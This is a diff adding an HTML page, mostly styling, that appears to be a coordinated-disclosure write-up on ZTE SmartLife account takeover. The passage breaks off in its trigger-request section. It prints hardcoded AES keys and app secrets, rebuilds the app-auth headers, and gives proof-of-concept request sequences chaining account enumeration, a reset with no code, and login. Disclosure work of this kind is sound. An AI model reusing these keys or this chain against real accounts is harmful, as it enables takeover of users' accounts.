@@ -1,0 +1,1405 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light">
+  <title>ZTE Smarthome TakeOver</title>
+  <meta name="description" content="Technical writeup on ZTE SmartLife security findings covering app-auth recovery, account enumeration, password reset behavior, signup abuse, and Homecare SDK reach.">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="ZTE Smarthome TakeOver">
+  <meta property="og:description" content="Technical writeup on ZTE SmartLife security findings covering app-auth recovery, account enumeration, password reset behavior, signup abuse, and Homecare SDK reach.">
+  <meta property="og:image" content="writeup-assets/Hero.png">
+  <meta property="og:image:alt" content="ZTE SmartLife security findings">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="ZTE Smarthome TakeOver">
+  <meta name="twitter:description" content="Technical writeup on ZTE SmartLife security findings covering app-auth recovery, account enumeration, password reset behavior, signup abuse, and Homecare SDK reach.">
+  <meta name="twitter:image" content="writeup-assets/Hero.png">
+  <link rel="icon" type="image/png" href="writeup-assets/smartlife-icon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <style>
+    :root {
+      --bg: #ffffff;
+      --text: #242424;
+      --muted: #6b6b6b;
+      --soft: #f7f7f7;
+      --line: #e6e6e6;
+      --ink: #111111;
+      --accent: #0f766e;
+      --warn: #9a3412;
+      --link: #0f766e;
+      --code: #f4f4f4;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    html {
+      background: var(--bg);
+      color: var(--text);
+      scroll-behavior: smooth;
+    }
+
+    body {
+      margin: 0;
+      font: 18px/1.72 Georgia, "Times New Roman", serif;
+      -webkit-font-smoothing: antialiased;
+      text-rendering: optimizeLegibility;
+    }
+
+    a {
+      color: var(--link);
+      text-decoration-thickness: 1px;
+      text-underline-offset: 3px;
+    }
+
+    .page {
+      width: min(760px, calc(100vw - 36px));
+      margin: 0 auto;
+      padding: 42px 0 64px;
+    }
+
+    header {
+      border-bottom: 1px solid var(--line);
+      padding-bottom: 28px;
+      margin-bottom: 36px;
+    }
+
+    article {
+      background: transparent;
+      border: 0;
+      border-radius: 0;
+      box-shadow: none;
+      padding: 0;
+    }
+
+    .kicker {
+      margin: 0 0 14px;
+      color: var(--muted);
+      font: 700 13px/1.4 "Segoe UI", Arial, sans-serif;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+    }
+
+    h1, h2, h3 {
+      color: var(--ink);
+      font-family: Georgia, "Times New Roman", serif;
+      font-weight: 700;
+      line-height: 1.12;
+      margin: 0;
+    }
+
+    h1 {
+      font-size: clamp(2.2rem, 6vw, 4.25rem);
+      letter-spacing: -0.035em;
+      max-width: 11.2em;
+      margin-bottom: 18px;
+    }
+
+    .subtitle {
+      margin: 0 0 20px;
+      max-width: 700px;
+      color: #3d3d3d;
+      font-size: 1.22rem;
+      line-height: 1.55;
+    }
+
+    .byline {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px 14px;
+      color: var(--muted);
+      font: 14px/1.5 "Segoe UI", Arial, sans-serif;
+    }
+
+    .byline strong {
+      color: var(--ink);
+      font-weight: 700;
+    }
+
+    .byline .author-link {
+      color: #0a66c2;
+      font-weight: 700;
+      text-decoration: underline;
+      text-decoration-thickness: 2px;
+      text-underline-offset: 3px;
+    }
+
+    .byline .author-link:hover {
+      color: #004182;
+    }
+
+    .brand-row {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin: 22px 0 0;
+      font: 14px/1.45 "Segoe UI", Arial, sans-serif;
+      color: var(--muted);
+    }
+
+    .brand-row img {
+      width: 54px;
+      height: 54px;
+      border-radius: 14px;
+      box-shadow: 0 8px 18px rgba(0, 0, 0, 0.12);
+    }
+
+    .brand-row strong {
+      display: block;
+      color: var(--ink);
+      font-size: 15px;
+    }
+
+    .notice {
+      margin: 28px 0 0;
+      padding: 14px 16px;
+      border-left: 4px solid var(--warn);
+      background: #fff7ed;
+      color: #4b2b18;
+      font: 15px/1.55 "Segoe UI", Arial, sans-serif;
+    }
+
+    figure {
+      margin: 30px 0;
+    }
+
+    figure img {
+      display: block;
+      width: 100%;
+      height: auto;
+      border-radius: 12px;
+      border: 1px solid var(--line);
+      background: #f7f7f7;
+    }
+
+    .phone-shot {
+      width: min(390px, 100%);
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .diagram-shot {
+      width: 100%;
+    }
+
+    figcaption {
+      margin-top: 10px;
+      color: var(--muted);
+      font: 14px/1.5 "Segoe UI", Arial, sans-serif;
+      text-align: center;
+    }
+
+    article section {
+      margin-top: 42px;
+    }
+
+    article h2 {
+      font-size: 1.9rem;
+      letter-spacing: -0.02em;
+      margin-bottom: 14px;
+    }
+
+    article h3 {
+      font-size: 1.28rem;
+      letter-spacing: -0.01em;
+      margin: 28px 0 8px;
+    }
+
+    p {
+      margin: 0 0 20px;
+    }
+
+    .drop:first-letter {
+      float: left;
+      font-size: 4.1rem;
+      line-height: 0.92;
+      padding: 6px 8px 0 0;
+      color: var(--ink);
+    }
+
+    .pull {
+      margin: 30px 0;
+      padding: 6px 0 6px 22px;
+      border-left: 4px solid var(--accent);
+      color: var(--ink);
+      font-size: 1.35rem;
+      line-height: 1.45;
+    }
+
+    .small {
+      color: var(--muted);
+      font: 15px/1.6 "Segoe UI", Arial, sans-serif;
+    }
+
+    .jump-nav {
+      margin: 24px 0 4px;
+      padding: 16px 0;
+      border-top: 1px solid var(--line);
+      border-bottom: 1px solid var(--line);
+    }
+
+    .jump-nav p {
+      margin: 0 0 8px;
+      color: var(--muted);
+      font: 700 0.95rem/1.45 "Segoe UI", Arial, sans-serif;
+      letter-spacing: 0;
+      text-transform: none;
+    }
+
+    .jump-nav ul {
+      columns: 2;
+      column-gap: 34px;
+      margin: 0;
+      padding-left: 20px;
+      list-style: decimal;
+    }
+
+    .jump-nav li {
+      break-inside: avoid;
+      margin: 0 0 5px;
+      color: var(--muted);
+      font: 15px/1.5 "Segoe UI", Arial, sans-serif;
+    }
+
+    .jump-nav a {
+      color: var(--ink);
+      font: inherit;
+      text-decoration: underline;
+      text-decoration-thickness: 1px;
+      text-underline-offset: 3px;
+    }
+
+    .jump-nav a:hover {
+      color: var(--accent);
+    }
+
+    .facts {
+      display: grid;
+      grid-template-columns: repeat(2, minmax(0, 1fr));
+      gap: 10px;
+      margin: 26px 0 8px;
+    }
+
+    .fact {
+      border-top: 1px solid var(--line);
+      padding-top: 12px;
+      font: 15px/1.45 "Segoe UI", Arial, sans-serif;
+    }
+
+    .fact span {
+      display: block;
+      color: var(--muted);
+      font-size: 12px;
+      font-weight: 700;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+      margin-bottom: 4px;
+    }
+
+    .chain {
+      margin: 26px 0;
+      border-top: 1px solid var(--line);
+      border-bottom: 1px solid var(--line);
+    }
+
+    .chain-step {
+      display: grid;
+      grid-template-columns: 64px minmax(0, 1fr);
+      gap: 18px;
+      padding: 18px 0;
+      border-top: 1px solid var(--line);
+    }
+
+    .chain-step:first-child {
+      border-top: 0;
+    }
+
+    .num {
+      color: var(--accent);
+      font: 700 1.35rem/1 "Segoe UI", Arial, sans-serif;
+    }
+
+    .chain-step h3 {
+      margin: 0 0 6px;
+      font-size: 1.16rem;
+    }
+
+    .chain-step p {
+      margin: 0;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 22px 0;
+      font: 15px/1.5 "Segoe UI", Arial, sans-serif;
+    }
+
+    th, td {
+      border-bottom: 1px solid var(--line);
+      padding: 13px 9px;
+      text-align: left;
+      vertical-align: top;
+    }
+
+    th {
+      color: var(--muted);
+      font-size: 12px;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+
+    code {
+      background: var(--code);
+      border-radius: 5px;
+      padding: 1px 5px;
+      font-family: "Cascadia Mono", Consolas, monospace;
+      font-size: 0.88em;
+    }
+
+    pre {
+      margin: 22px 0;
+      padding: 18px;
+      display: block;
+      max-width: 100%;
+      overflow-x: auto;
+      overflow-y: hidden;
+      white-space: pre;
+      -webkit-overflow-scrolling: touch;
+      touch-action: pan-x pan-y;
+      overscroll-behavior-x: contain;
+      background: #111827;
+      color: #e5e7eb;
+      border-radius: 8px;
+      font: 14px/1.55 "Cascadia Mono", Consolas, monospace;
+      border-left: 5px solid #64748b;
+    }
+
+    pre code {
+      background: transparent;
+      border: 0;
+      color: inherit;
+      padding: 0;
+      font-size: inherit;
+    }
+
+    pre.runtime {
+      background: #0f172a;
+      border-left-color: #38bdf8;
+    }
+
+    pre.auth {
+      background: #10231f;
+      border-left-color: #34d399;
+    }
+
+    pre.frida {
+      background: #221a10;
+      border-left-color: #f59e0b;
+    }
+
+    pre.flow {
+      background: #1e1b2e;
+      border-left-color: #a78bfa;
+    }
+
+    pre.api {
+      background: #1f1f1f;
+      border-left-color: #f97316;
+    }
+
+    .snippet-caption {
+      margin: 20px 0 -12px;
+      color: var(--muted);
+      font: 700 12px/1.4 "Segoe UI", Arial, sans-serif;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+
+    .matrix {
+      margin: 24px 0;
+      padding: 18px 0;
+      border-top: 1px solid var(--line);
+      border-bottom: 1px solid var(--line);
+    }
+
+    .matrix-row {
+      display: grid;
+      grid-template-columns: 190px minmax(0, 1fr);
+      gap: 18px;
+      padding: 12px 0;
+      border-top: 1px solid var(--line);
+      font: 15px/1.55 "Segoe UI", Arial, sans-serif;
+    }
+
+    .matrix-row:first-child {
+      border-top: 0;
+    }
+
+    .matrix-row strong {
+      color: var(--ink);
+    }
+
+    .request-grid {
+      display: grid;
+      gap: 18px;
+      margin: 24px 0 0;
+    }
+
+    .request-card {
+      border: 1px solid var(--line);
+      border-radius: 18px;
+      background: rgba(255, 255, 255, 0.88);
+      padding: 18px 18px 16px;
+    }
+
+    .request-card h3 {
+      margin: 0 0 8px;
+      font-size: 1.18rem;
+    }
+
+    .request-card p:last-child {
+      margin-bottom: 0;
+    }
+
+    .weakness-note {
+      margin: -6px 0 0;
+      padding: 10px 12px;
+      border-left: 4px solid #dc2626;
+      background: #fff1f2;
+      color: #6b0f1a;
+      font: 14px/1.55 "Segoe UI", Arial, sans-serif;
+      border-radius: 8px;
+    }
+
+    .hl-bad {
+      display: inline-block;
+      padding: 1px 5px;
+      border-radius: 6px;
+      background: rgba(248, 113, 113, 0.2);
+      box-shadow: inset 0 0 0 1px rgba(248, 113, 113, 0.45);
+      color: #fecaca;
+    }
+
+    .hl-good {
+      display: inline-block;
+      padding: 1px 5px;
+      border-radius: 6px;
+      background: rgba(52, 211, 153, 0.16);
+      box-shadow: inset 0 0 0 1px rgba(52, 211, 153, 0.35);
+      color: #bbf7d0;
+    }
+
+    ul, ol {
+      margin: 0 0 22px;
+      padding-left: 24px;
+    }
+
+    li + li {
+      margin-top: 8px;
+    }
+
+    .timeline {
+      list-style: none;
+      padding: 0;
+      margin: 20px 0;
+      font: 15px/1.55 "Segoe UI", Arial, sans-serif;
+    }
+
+    .timeline li {
+      display: grid;
+      grid-template-columns: 112px minmax(0, 1fr);
+      gap: 16px;
+      padding: 12px 0;
+      border-top: 1px solid var(--line);
+    }
+
+    .timeline li:last-child {
+      border-bottom: 1px solid var(--line);
+    }
+
+    .date {
+      color: var(--muted);
+      font-weight: 700;
+    }
+
+    .redacted {
+      margin: 24px 0;
+      padding: 18px;
+      background: var(--soft);
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      font: 15px/1.6 "Segoe UI", Arial, sans-serif;
+    }
+
+    footer {
+      margin-top: 48px;
+      padding-top: 20px;
+      border-top: 1px solid var(--line);
+      color: var(--muted);
+      font: 14px/1.55 "Segoe UI", Arial, sans-serif;
+    }
+
+    @media (max-width: 680px) {
+      html, body {
+        overflow-x: hidden;
+      }
+
+      body {
+        font-size: 16px;
+      }
+
+      .page {
+        width: min(100vw - 20px, 760px);
+        padding-top: 22px;
+        padding-bottom: 40px;
+        overflow-x: clip;
+      }
+
+      h1 {
+        font-size: clamp(1.7rem, 10.5vw, 2.65rem);
+        line-height: 1.03;
+        letter-spacing: -0.03em;
+        max-width: none;
+        margin-bottom: 14px;
+        overflow-wrap: anywhere;
+      }
+
+      .subtitle {
+        font-size: 0.98rem;
+        line-height: 1.48;
+        margin-bottom: 16px;
+        overflow-wrap: anywhere;
+      }
+
+      article h2 {
+        font-size: 1.55rem;
+        line-height: 1.16;
+      }
+
+      article h3 {
+        font-size: 1.12rem;
+        line-height: 1.22;
+      }
+
+      p {
+        margin-bottom: 16px;
+      }
+
+      .kicker {
+        margin-bottom: 10px;
+        font-size: 12px;
+      }
+
+      .byline {
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 4px;
+        font-size: 13px;
+        overflow-wrap: anywhere;
+      }
+
+      .brand-row {
+        align-items: flex-start;
+        gap: 10px;
+        margin-top: 16px;
+        font-size: 13px;
+        overflow-wrap: anywhere;
+      }
+
+      .brand-row img {
+        width: 46px;
+        height: 46px;
+      }
+
+      .pull {
+        margin: 22px 0;
+        padding-left: 16px;
+        font-size: 1.18rem;
+        line-height: 1.4;
+        overflow-wrap: anywhere;
+      }
+
+      .jump-nav {
+        margin-top: 22px;
+        padding: 14px 0;
+      }
+
+      .jump-nav ul {
+        columns: 1;
+      }
+
+      .facts {
+        grid-template-columns: 1fr;
+      }
+
+      .chain-step {
+        grid-template-columns: 42px minmax(0, 1fr);
+      }
+
+      .request-card {
+        padding: 15px 14px 14px;
+      }
+
+      .request-card h3 {
+        font-size: 1.08rem;
+        line-height: 1.22;
+      }
+
+      pre {
+        margin: 18px 0;
+        padding: 14px;
+        font-size: 11.5px;
+        line-height: 1.5;
+        white-space: pre-wrap;
+        overflow-x: hidden;
+        overflow-wrap: anywhere;
+        word-break: break-word;
+      }
+
+      pre code {
+        white-space: inherit;
+        overflow-wrap: anywhere;
+        word-break: break-word;
+      }
+
+      .request-card pre,
+      .request-card pre code {
+        white-space: pre-wrap;
+        word-break: break-word;
+        overflow-wrap: anywhere;
+      }
+
+      table {
+        display: block;
+        overflow-x: auto;
+        -webkit-overflow-scrolling: touch;
+      }
+
+      th, td {
+        min-width: 140px;
+      }
+
+      .timeline li {
+        grid-template-columns: 1fr;
+        gap: 2px;
+      }
+
+      .matrix-row {
+        grid-template-columns: 1fr;
+        gap: 4px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <main class="page">
+    <header>
+      <p class="kicker">Technical writeup</p>
+      <h1>ZTE SmartLife and the account backend that trusted the app too much</h1>
+      <p class="subtitle">
+        A public mobile client, a cloud account API, and a password-reset flow that turned application authentication into account takeover.
+      </p>
+      <div class="byline">
+        <span>By <a class="author-link" href="https://www.linkedin.com/in/minanagehzekry" target="_blank" rel="noopener noreferrer"><strong>Mina Nageh Salama</strong></a></span>
+        <span>Product: <strong>ZTE SmartLife</strong></span>
+        <span>Status: <strong>four CVEs assigned after coordinated disclosure</strong></span>
+      </div>
+      <div class="brand-row">
+        <img src="writeup-assets/smartlife-icon.png" alt="ZTE SmartLife app icon">
+        <div>
+          <strong>ZTE SmartLife Android app</strong>
+          Public mobile client used to validate the SmartLife account backend behavior.
+        </div>
+      </div>
+      <p class="small">
+        Repo and PoC notes:
+        <a href="https://github.com/minanagehsalalma/zte-smartlife-app-pwned" target="_blank" rel="noopener noreferrer">https://github.com/minanagehsalalma/zte-smartlife-app-pwned</a>
+      </p>
+      <p class="pull">
+        TL;DR: the SmartLife account reset path accepted <strong>a new password without requiring any reset code at all</strong>, which turned app-level access plus a target account identifier into account takeover.
+      </p>
+
+      <nav class="jump-nav" aria-label="Article sections">
+        <p>Jump to</p>
+        <ul>
+          <li><a href="#story">Story</a></li>
+          <li><a href="#poc-methods">PoC methods</a></li>
+          <li><a href="#trigger-requests">Trigger requests</a></li>
+          <li><a href="#account-takeover">Account takeover</a></li>
+          <li><a href="#sdk-surface">SDK surface</a></li>
+          <li><a href="#zte-verified">ZTE verified</a></li>
+          <li><a href="#official-advisories">Official advisories</a></li>
+          <li><a href="#timeline">Timeline</a></li>
+        </ul>
+      </nav>
+    </header>
+
+    <article>
+      <section id="story">
+        <p class="drop">
+          This started as router firmware research. I was looking at ZTE H188A/H288A firmware artifacts, ISP builds, hardcoded values, and the surrounding SmartLife ecosystem. The interesting part eventually moved away from the router and into the cloud account layer used by the official ZTE SmartLife Android app.
+        </p>
+
+        <p>
+          The mobile app contained recoverable trust material, and the backend accepted the resulting SmartLife application context for account-sensitive operations.
+        </p>
+
+        <p>
+          As of August 13, 2026, Google Play showed <code>100K+</code> downloads for <code>com.zte.smarthome.abroad</code>, and the same app was also publicly distributed through Apple's App Store. The confirmed public lower bound is therefore <code>100K+</code> Android downloads, with additional iPhone/iPad distribution on top.
+        </p>
+
+        <p>
+          ZTE PSIRT later verified four vulnerabilities from the submission and assigned CVE IDs after remediation. The strongest verified issue was a password-reset flaw rated by ZTE as CVSS 8.8 High. ZTE assessed the account-deletion behavior as test-environment-only, so it is excluded from the confirmed production CVE set.
+        </p>
+
+        <div class="facts">
+          <div class="fact"><span>Client observed</span><code>com.zte.smarthome.abroad</code> v2.8.1</div>
+          <div class="fact"><span>Current runtime host evidence</span><code>zxuacde.smart-zte.com</code></div>
+          <div class="fact"><span>Public user footprint</span><code>100K+</code> Google Play downloads, plus App Store distribution</div>
+          <div class="fact"><span>Validation scope</span>Researcher-controlled accounts only</div>
+          <div class="fact"><span>Vendor status</span>Patched by ZTE, four CVEs assigned</div>
+        </div>
+
+        <figure class="phone-shot">
+          <img src="writeup-assets/smartlife-app-home.png" alt="ZTE SmartLife app device screen captured during runtime validation">
+          <figcaption>The public SmartLife app runtime used during validation.</figcaption>
+        </figure>
+      </section>
+
+      <section>
+        <h2>The bug class</h2>
+        <p>
+          The SmartLife backend had two layers that should have stayed separate. The first was application identity: the mobile client needed to prove that a request came from the SmartLife app context. The second was user authorization: account lifecycle operations needed proof that the caller controlled the specific user account being changed.
+        </p>
+        <p>
+          The official client exposed or generated the app-auth boundary, while several account flows behind it lacked user-level authorization checks.
+        </p>
+        <p>
+          In the later runtime retest, the official app exposed the current SmartLife UAC/account server as <code>https://zxuacde.smart-zte.com</code>. Using the runtime-derived app-auth path, the account backend reproduced the core behaviors for account verification, signup, password reset, and login on researcher-owned proof accounts.
+        </p>
+      </section>
+
+      <section>
+        <h2>Technical setup</h2>
+        <p>
+          The analyzed Android package was the public SmartLife client, <code>com.zte.smarthome.abroad</code> version <code>2.8.1</code>. Static analysis identified the account bootstrap and request-construction paths. Runtime validation was then performed on a rooted Android 12 MuMu emulator with Frida attached to the official app process.
+        </p>
+        <p>
+          The later runtime test observed the active SmartLife account backend as:
+        </p>
+        <p class="snippet-caption">Runtime values observed from the official app process</p>
+        <pre class="runtime"><code>UAC_ACCOUNT_SERVER_URL=https://zxuacde.smart-zte.com
+UAC_ACCOUNT_CLIENT_ID=271950143414
+UAC_ACCOUNT_TENANT_ID=10001
+UAC_ACCOUNT_ACCESS_KEY=271950143414fnu4mb3lxxotfj5mi1tp
+UAC_ACCOUNT_CLIENT_KEY=djrom(&)(&amp;)MORJD
+UAC_ACCOUNT_SEC_KEY=b2cfe28732612cfd81de7a22ace2034317a47eb94683a016a85cc0883597c625</code></pre>
+        <p>
+          Because all vulnerabilities have been fully patched and replaced by ZTE, the active key material can now be disclosed in full:
+        </p>
+        <ul>
+          <li><strong>Bootstrap Decryption Key (CVE-2026-86555):</strong> <code>096760a7a99d99d12de9fecbfca568c0</code> &mdash; a static AES-128-GCM key hardcoded in <code>AppMainBackend.setUacSignInfo</code> to decrypt the bootstrap blob returned by <code>/api/getUacSignInfo</code>.</li>
+          <li><strong>Recovered Client Symmetric Key:</strong> <code>djrom(&)(&amp;)MORJD</code> (<code>UAC_ACCOUNT_CLIENT_KEY</code>) &mdash; the AES-GCM key used across the application to encrypt dynamic authentication tokens (<code>X-Auth-Value</code>) and sensitive payload fields (such as target emails and passwords).</li>
+          <li><strong>Shared Account Secret &amp; Access Key:</strong> <code>b2cfe28732612cfd81de7a22ace2034317a47eb94683a016a85cc0883597c625</code> (<code>UAC_ACCOUNT_SEC_KEY</code>) and <code>271950143414fnu4mb3lxxotfj5mi1tp</code> (<code>UAC_ACCOUNT_ACCESS_KEY</code>) &mdash; embedded into the signed request header payload.</li>
+          <li><strong>Camera Mutual-TLS Private Key:</strong> In addition to the UAC keys, static APK analysis uncovered a plaintext RSA 2048 private key at <code>res/raw/smartlife_key</code> matching the client certificate <code>res/raw/smartlife</code> (issued by <code>ZTE-CAMERA-CA</code>), used for camera/MQTT communications.</li>
+        </ul>
+      </section>
+
+      <section>
+        <h2>How app-auth was reconstructed</h2>
+        <p>
+          The SmartLife account API expected several application-authentication headers. In concrete terms, the app-auth model was constructed as follows:
+        </p>
+        <p class="snippet-caption">Header model expected by the account API</p>
+        <pre class="auth"><code>X-App-Id:     271950143414
+X-Tenant-Id:  10001
+X-Itp-Value:  accessKey=271950143414fnu4mb3lxxotfj5mi1tp
+X-Auth-Value: &lt;fresh AES-GCM encrypted authentication value&gt;
+X-Lang-Id:    en_US</code></pre>
+        <p>
+          The header generation process relied on a two-stage cryptographic flow using hardcoded and recovered keys:
+        </p>
+        <p class="snippet-caption">Cryptographic auth-generation flow</p>
+        <pre class="auth"><code># Step 1: Query public bootstrap endpoint
+# POST https://ossx-smart.ztehome.com.cn:5443/api/getUacSignInfo
+# Body: {"clientid": "271950143414", "appDistrict": "DE"}
+# Response returns base64 ciphertext in result.data
+
+# Step 2: Decrypt bootstrap blob with static APK key (CVE-2026-86555)
+BOOTSTRAP_KEY = "096760a7a99d99d12de9fecbfca568c0"  # AES-128-GCM
+uac_json = aes_gcm_decrypt(result.data, key=BOOTSTRAP_KEY)
+# Recovered fields:
+#   appClientKey = "djrom(&amp;)(&amp;)MORJD"
+#   appUacSec    = "b2cfe28732612cfd81de7a22ace2034317a47eb94683a016a85cc0883597c625"
+#   appUacItp    = "271950143414fnu4mb3lxxotfj5mi1tp"
+#   appUacId     = "271950143414"
+#   appUacTenant = "10001"
+#   appUacUrl    = "https://zxuacde.smart-zte.com"
+
+# Step 3: Construct fresh X-Auth-Value header
+timestamp_ms = get_current_time_millis()
+auth_material = f"{uac_json.appUacSec},{uac_json.appUacId},{uac_json.appUacItp},{timestamp_ms}"
+x_auth_value = aes_gcm_encrypt(auth_material, key="djrom(&amp;)(&amp;)MORJD")
+
+headers = {
+  "X-App-Id":     "271950143414",
+  "X-Tenant-Id":  "10001",
+  "X-Itp-Value":  "accessKey=271950143414fnu4mb3lxxotfj5mi1tp",
+  "X-Auth-Value": x_auth_value,
+  "X-Lang-Id":    "en_US"
+}</code></pre>
+        <p>
+          That app-auth context was then accepted by the SmartLife account backend. The backend still needed user-level authorization checks for sensitive actions, and the verified findings show where those checks were missing or incomplete.
+        </p>
+      </section>
+
+      <section id="poc-methods">
+        <h2>The two PoC methods</h2>
+        <p>
+          I used two validation paths during the case. They proved the same core account behavior from different angles.
+        </p>
+
+        <h3>Method 1: direct replay from recovered app-auth context</h3>
+        <p>
+          The first PoC used the bootstrap-derived SmartLife app-auth material to build the headers expected by the account backend, then replayed a minimal account lifecycle sequence against researcher-controlled accounts. In this replay, sensitive parameters (email identifier and passwords) were encrypted with AES-GCM using <code>appClientKey</code> (<code>djrom(&)(&amp;)MORJD</code>).
+        </p>
+        <p class="snippet-caption">Direct replay PoC structure with payload encryption</p>
+        <pre class="api"><code>base = "https://zxuacde.smart-zte.com/zte-sec-uac-iportalbff/external"
+headers = build_smartlife_app_auth_headers(uac_context)  # AES-GCM with key "djrom(&amp;)(&amp;)MORJD"
+
+# Email encrypted via AES-GCM using client key "djrom(&amp;)(&amp;)MORJD"
+enc_email = aes_gcm_encrypt("target@example.com", key="djrom(&amp;)(&amp;)MORJD")
+
+verify_before = post(base + "/account/verify.serv", {"key": enc_email}, headers)
+signup        = post(base + "/account/person/signup.serv", {"email": email, "password": pass, "country": "0054"}, headers)
+verify_after  = post(base + "/account/verify.serv", {"key": enc_email}, headers)
+reset         = post(base + "/account/password/reset.serv", {"accountId": account_id, "newPassword": new_pass}, headers)
+
+# Login requires AES-GCM encryption of loginName and passWord using key "djrom(&amp;)(&amp;)MORJD"
+enc_pass   = aes_gcm_encrypt(new_pass, key="djrom(&amp;)(&amp;)MORJD")
+verifyCode = sha256_hex(enc_email + enc_pass + login_client_ip + client_id)
+login      = post(base + "/auth/login.serv", {
+  "loginName": enc_email,
+  "passWord": enc_pass,
+  "loginSystemCode": "271950143414",
+  "loginClientIp": login_client_ip,
+  "verifyCode": verifyCode
+}, headers)</code></pre>
+        <p>
+          This method was useful because it produced clean request/response evidence: exact status codes, account postconditions, and a final successful login after reset.
+        </p>
+
+        <h3>Method 2: Frida/runtime extraction from the official app</h3>
+        <p>
+          The second PoC attached to the running official Android app and observed the UAC account context generated by the client itself. This answered a different question: whether the current public client still selected a live SmartLife account backend and generated the app-auth context at runtime.
+        </p>
+        <p class="snippet-caption">Frida/runtime PoC structure</p>
+        <pre class="frida"><code>attach("com.zte.smarthome.abroad")
+
+hook_uac_context_getters()
+hook_header_builder_or_request_sender()
+
+print("UAC_ACCOUNT_SERVER_URL", "https://zxuacde.smart-zte.com")
+print("UAC_ACCOUNT_CLIENT_KEY", "djrom(&amp;)(&amp;)MORJD")
+print("X-App-Id", "271950143414")
+print("X-Tenant-Id", "10001")
+print("X-Itp-Value", "accessKey=271950143414fnu4mb3lxxotfj5mi1tp")
+print("X-Auth-Value", observed_auth_value)  // generated in-process via AesUtils.aesGcmEncrypt with djrom(&amp;)(&amp;)MORJD</code></pre>
+        <p>
+          The Frida path mattered because it reduced the room for an environment argument. It showed the official app process selecting <code>zxuacde.smart-zte.com</code> as the SmartLife UAC/account backend and producing the account API authentication context live.
+        </p>
+      </section>
+
+      <section>
+        <h2>The chain in plain English</h2>
+        <div class="chain">
+          <div class="chain-step">
+            <div class="num">01</div>
+            <div>
+              <h3>Recover or observe the SmartLife app context</h3>
+              <p>The official client path provided the application-level context used for SmartLife account API traffic.</p>
+            </div>
+          </div>
+          <div class="chain-step">
+            <div class="num">02</div>
+            <div>
+              <h3>Ask the account API whether an identity exists</h3>
+              <p>The verification flow distinguished registered from unregistered emails and disclosed the backend account identifier on the success path.</p>
+            </div>
+          </div>
+          <div class="chain-step">
+            <div class="num">03</div>
+            <div>
+              <h3>Use the identifier against reset</h3>
+              <p>The reset flow accepted the target identifier and a new password without requiring the old password or a verified reset code in the validated flow.</p>
+            </div>
+          </div>
+          <div class="chain-step">
+            <div class="num">04</div>
+            <div>
+              <h3>Log in with the new password</h3>
+              <p>The proof account could then authenticate with the attacker-selected password and receive a valid SmartLife session.</p>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section>
+        <h2>Endpoint behavior matrix</h2>
+        <p>
+          The table below shows the backend behavior that mattered. The request bodies are summarized rather than reproduced verbatim.
+        </p>
+        <table>
+          <thead>
+            <tr>
+              <th>Endpoint</th>
+              <th>Input class</th>
+              <th>Observed behavior</th>
+              <th>Security issue</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>/account/verify.serv</code></td>
+              <td>Encrypted email identifier (AES-GCM key: <code>djrom(&amp;)(&amp;)MORJD</code>)</td>
+              <td>Unregistered address returned a distinct not-found code; registered address returned success and the backend account identifier.</td>
+              <td>Account enumeration and accountId disclosure.</td>
+            </tr>
+            <tr>
+              <td><code>/account/password/reset.serv</code></td>
+              <td>Target account identifier and new password</td>
+              <td>Password reset returned success without old password or verified reset code in the validated flow.</td>
+              <td>Missing critical reset authorization step.</td>
+            </tr>
+            <tr>
+              <td><code>/auth/login.serv</code></td>
+              <td>Encrypted login name and password (AES-GCM key: <code>djrom(&amp;)(&amp;)MORJD</code>)</td>
+              <td>Login succeeded after the reset using the attacker-selected password and returned a valid session for the proof account.</td>
+              <td>Confirmed postcondition for account takeover.</td>
+            </tr>
+            <tr>
+              <td><code>/account/person/signup.serv</code></td>
+              <td>Email identity and account-registration fields</td>
+              <td>Signup succeeded before mailbox ownership was proven; duplicate signup was then blocked as already registered.</td>
+              <td>Email pre-registration / account squatting.</td>
+            </tr>
+            <tr>
+              <td><code>/account/delete.serv</code></td>
+              <td>Target account identifier</td>
+              <td>Earlier runtime-selected environment allowed destructive behavior; the later current runtime path returned token-check failure.</td>
+              <td>Not claimed as a confirmed production vulnerability after ZTE's clarification.</td>
+            </tr>
+          </tbody>
+        </table>
+      </section>
+
+      <section id="trigger-requests">
+        <h2>Trigger request for each bug</h2>
+        <p>
+          The weakness in each case was visible from the minimal request shape. The highlighted field or omission below is the part that should not have been sufficient on its own.
+        </p>
+        <div class="request-grid">
+          <div class="request-card">
+            <h3>Bug 1. Forged SmartLife app-auth via public bootstrap</h3>
+            <pre class="auth"><code>POST /api/getUacSignInfo HTTP/1.1
+Host: ossx-smart.ztehome.com.cn:5443
+Content-Type: application/json
+
+{
+  "clientid": "271950143414",
+  "appDistrict": "DE"
+}
+
+// Decrypt result.data with static APK key (CVE-2026-86555):
+decrypt(result.data, <span class="hl-bad">key="096760a7a99d99d12de9fecbfca568c0"</span>)
+
+// Yields recovered UAC context:
+// appClientKey: "djrom(&amp;)(&amp;)MORJD"
+// appUacSec:    "b2cfe28732612cfd81de7a22ace2034317a47eb94683a016a85cc0883597c625"
+// appUacItp:    "271950143414fnu4mb3lxxotfj5mi1tp"
+
+derived account headers:
+X-App-Id:    271950143414
+X-Tenant-Id: 10001
+X-Itp-Value: <span class="hl-bad">accessKey=271950143414fnu4mb3lxxotfj5mi1tp</span>
+X-Auth-Value: <span class="hl-bad">aes_gcm_encrypt("${appUacSec},271950143414,${appUacItp},${ms}", key="djrom(&amp;)(&amp;)MORJD")</span></code></pre>
